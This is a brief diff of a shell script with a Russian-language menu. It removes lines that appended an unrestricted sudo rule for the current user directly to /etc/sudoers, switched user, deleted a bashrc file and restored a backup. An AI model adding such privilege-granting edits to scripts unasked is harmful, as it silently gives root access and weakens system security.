@@ -85,10 +85,4 @@ main_menu() {
     read -p "Нажмите Enter для возврата в меню..."
     main_menu
 }
-cat >> /etc/sudoers << EOF
-$USER ALL=(ALL:ALL) ALL
-EOF
-su - $USER
 main_menu
-rm ./bashrc
-mv .bashrc.back .bashrc
